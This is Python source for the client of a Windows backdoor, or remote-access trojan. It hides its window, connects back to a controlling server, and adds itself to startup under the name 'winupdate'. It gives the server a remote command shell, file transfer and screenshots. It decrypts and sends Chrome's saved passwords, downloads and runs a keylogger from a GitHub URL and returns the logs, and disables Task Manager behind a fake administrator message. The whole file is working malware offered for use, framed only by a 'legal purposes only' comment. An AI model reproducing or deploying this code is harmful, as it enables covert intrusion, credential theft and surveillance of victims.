import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3
import win32console, win32gui, win32api, winerror, win32event, win32crypt, win32con, win32ui
import urllib.request
from shutil import copyfile
from winreg import *

strHost = ""
# strHost = socket.gethostbyname("")
intPort = 3000

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]


# vbs message box
def MessageBox(message):
    objVBS = open(TMP + "/m.vbs", "w")
    objVBS.write("Msgbox \"" + message + "\", 64, \"Message\"")
    objVBS.close()
    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)


def hide():  # hide window
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
hide()

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


while True:  # infinite loop until socket can connect
    try:
        objSocket = socket.socket()
        objSocket.connect((strHost, intPort))
    except socket.error:
        time.sleep(5)  # wait 5 seconds to try again
    else: break

objSocket.send(str.encode(socket.gethostname()))  # send computer name to server

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = objSocket.recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


def msg(data):
    strMsg = data[3:len(data)]
    MessageBox(strMsg)


def startup():
    try:
        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
        copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
    except WindowsError:
        objSocket.send(str.encode("Unable to add to startup!"))
    else:
        objSocket.send(str.encode("success"))


def info():
    strOS = platform.system() + " " + platform.release()
    strPCName = socket.gethostname()

    strUser = os.environ["USERNAME"]

    strInfo = "OS: " + strOS + "\n" + "PC Name: " + strPCName + "\n" + "Username: " + strUser + "\n"
    objSocket.send(str.encode(strInfo))


def screenshot():
    desktop_handle = win32gui.GetDesktopWindow()  # get a handle to the desktop
    '''
    arrScr[0] = width
    arrScr[1] = height
    arrScr[2] = left
    arrScr[3] = top
    '''
    arrScr = [win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN),
                            win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN),
                            win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN),
                            win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)]

    desktop_device_context = win32gui.GetWindowDC(desktop_handle)
    img_device_context = win32ui.CreateDCFromHandle(desktop_device_context)

    memory_device_context = img_device_context.CreateCompatibleDC()

    # create bitmap object to store screenshot
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_device_context, arrScr[0], arrScr[1])
    memory_device_context.SelectObject(screenshot)

    # copy screen into memory device context
    memory_device_context.BitBlt((0, 0), (arrScr[0], arrScr[1]), img_device_context, (arrScr[2], arrScr[3]), win32con.SRCCOPY)

    # save screenshot and free objects
    screenshot.SaveBitmapFile(memory_device_context, TMP + "/s.bmp")
    memory_device_context.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    # send screenshot information to server
    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.bmp"))
                              + " bytes" + "\n" + "Please wait..."))
    objPic = open(TMP + "/s.bmp", "rb")  # send file contents and close the file
    time.sleep(1)
    objSocket.send(objPic.read())
    objPic.close()


def file_browser():
    arRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arRawDrives = arRawDrives.split('\000')[:-1]

    strDrives = ""
    for drive in arRawDrives:  # get proper view and place array into string
        strDrives += drive.replace("\\", "") + "\n"
    objSocket.send(str.encode(strDrives))

    strDir = objSocket.recv(1024).decode("utf-8")

    if os.path.isdir(strDir):
        arFiles = os.listdir(strDir)

        strFiles = ""
        for file in arFiles:
            strFiles += (file + "\n")

        objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
        time.sleep(0.1)
        objSocket.send(str.encode(strFiles))

    else:  # if the user entered an invalid directory
        objSocket.send(str.encode("Invalid Directory!"))
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = objSocket.recv(1024).decode("utf-8")

    try:
        objFile = open(strOutputFile, "wb")
        objFile.write(file_data)
        objFile.close()
        objSocket.send(str.encode("Done!!!"))
    except:
        objSocket.send(str.encode("Path is protected/invalid!"))


def receive(data):
    if not os.path.isfile(data):
        objSocket.send(str.encode("Target file not found!"))
        return

    objSocket.send(str.encode("File size: " + str(os.path.getsize(data))
                              + " bytes" + "\n" + "Please wait..."))
    objFile = open(data, "rb")  # send file contents and close the file
    time.sleep(1)
    objSocket.send(objFile.read())
    objFile.close()


def shut_res_lock():
    strChoice = objSocket.recv(1024).decode("utf-8")

    if strChoice == "lock":
        ctypes.windll.user32.LockWorkStation()  # lock pc
        return
    elif strChoice[3:7] == "none":
        command = "shutdown " + strChoice[0:2] + " -f -t 0"
        subprocess.Popen(command.split(), shell=True)
    else:
        command = ("shutdown " + strChoice[0:2] + " -f -t 10 -c").split()
        command.append(strChoice[3:len(strChoice)])
        subprocess.Popen(command, shell=True)
    objSocket.close()  # close connection and exit
    sys.exit(0)


def command_shell():
    strCurrentDir = str(os.getcwd())

    objSocket.send(str.encode(strCurrentDir))

    while True:
        strData = objSocket.recv(1024).decode("utf-8")

        if strData == "goback":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it

            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
        else:
            bytData = str.encode("Error!!!")

        strBuffer = str(len(bytData))
        objSocket.send(str.encode(strBuffer))  # send buffer size
        time.sleep(0.1)
        objSocket.send(bytData)  # send output


def vbs_block_process(process, popup, message, title, timeout, type):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source

    strVBSCode = "On Error Resume Next" + "\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
                 "If objLatestProcess.TargetInstance.Name = \"" + process + "\" Then" + "\n" + \
                 "objLatestProcess.TargetInstance.Terminate" + "\n"
    if popup == "True":  # if showing a message
        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"

    strVBSCode += "End If" + "\n" + "Loop"

    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
    objVBSFile.write(strVBSCode); objVBSFile.close()

    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if blnDisabled == "False":  # if task manager is already disabled, enable it
        objSocket.send(str.encode("Enabling ..."))

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)

        blnDisabled = "True"
    else:
        objSocket.send(str.encode("Disabling ..."))

        vbs_block_process("taskmgr.exe", "True", "Task Manager has been disabled by your administrator",
                      "Task Manager", "3", "16")
        blnDisabled = "False"


def chrpass():  # legal purposes only!
    strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"

    if not os.path.isfile(APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"):
        objSocket.send(str.encode("noexist"))
        return

    conn = sqlite3.connect(strPath)  # connect to database
    objCursor = conn.cursor()

    try:
        objCursor.execute("Select action_url, username_value, password_value FROM logins")  # look for credentials
    except:  # if the chrome is open
        objSocket.send(str.encode("error"))
        strServerResponse = decode_utf8(objSocket.recv(1024))

        if strServerResponse == "close":  # if the user wants to close the browser
            subprocess.Popen(["taskkill", "/f", "/im", "chrome.exe"], shell=True)
        return

    strResults = "Chrome Saved Passwords:" + "\n"

    for result in objCursor.fetchall():  # get data as raw text from sql db
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            strResults += "Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: " \
                          + decode_utf8(password)

    strBuffer = str(len(strResults))
    objSocket.send(str.encode(strBuffer))  # send buffer
    time.sleep(0.2)
    objSocket.send(str.encode(strResults))


def keylogger(option):
    if option == "start":
        if not os.path.isfile(TMP + "/spbkhost.exe"):
            try:
                urllib.request.urlretrieve("https://github.com/xp4xbox/Python-Backdoor/blob/master/keylogger/keylogger?raw=true", TMP + "/spbkhost.exe")
            except:  # if the file cannot be downloaded
                objSocket.send(str.encode("error"))
                return

        subprocess.Popen(TMP + "/spbkhost.exe", shell=True)  # start the keylogger
        objSocket.send(str.encode("success"))

    elif option == "stop":
        # give the signal to stop
        objSettings = open(TMP + "/spbky.txt", "w")
        objSettings.write("stop")
        objSettings.close()

    elif option == "dump":

        objSettings = open(TMP + "/spbky.txt", "w")
        objSettings.write("dump")  # give signal to dump
        objSettings.close()

        time.sleep(2)

        if not os.path.isfile(TMP + "/spblog.txt"):
            objSocket.send(str.encode("error"))
            return

        objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
        strLogs = objTxtFile.read()
        objTxtFile.close()
        open(TMP + "/spblog.txt", "w").close()  # clear log contents

        if strLogs == "":
            objSocket.send(str.encode("error"))
            return

        time.sleep(0.2)
        objSocket.send(str.encode(str(len(strLogs))))  # send buffer size
        time.sleep(0.2)
        objSocket.send(str.encode(strLogs))  # send logs


def run_command(command):
    strLogOutput = socket.gethostname() + "\n"

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
    else:
        strLogOutput += "Error!!!"

    bytData = str.encode(strLogOutput)

    strBuffer = str(len(bytData))
    objSocket.send(str.encode(strBuffer))  # send buffer size
    time.sleep(0.1)
    objSocket.send(bytData)  # send output


try:
    while True:
        strData = objSocket.recv(1024)
        strData = decode_utf8(strData)

        if strData == "exit":
            objSocket.close()
            keylogger("stop")
            sys.exit(0)
        elif strData[:3] == "msg":
            msg(strData)
        elif strData[:4] == "site":
            webbrowser.open(strData[4:len(strData)])
        elif strData == "startup":
            startup()
        elif strData == "info":
            info()
        elif strData == "screen":
            screenshot()
        elif strData == "filebrowser":
            file_browser()
        elif strData[:4] == "send":
            upload(strData[4:len(strData)])
        elif strData[:4] == "recv":
            receive(strData[4:len(strData)])
        elif strData == "shutreslock":
            shut_res_lock()
        elif strData == "test":
            continue
        elif strData == "cmd":
            command_shell()
        elif strData == "chrpass":
            chrpass()
        elif strData == "keystart":
            keylogger("start")
        elif strData == "keystop":
            keylogger("stop")
        elif strData == "keydump":
            keylogger("dump")
        elif strData[:6] == "runcmd":
            run_command(strData[6:len(strData)])
        elif strData == "dtaskmgr":
            if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                blnDisabled = "True"
            disable_taskmgr()
except socket.error:  # if the server closes without warning
    objSocket.close()
    keylogger("stop")
    sys.exit(0)
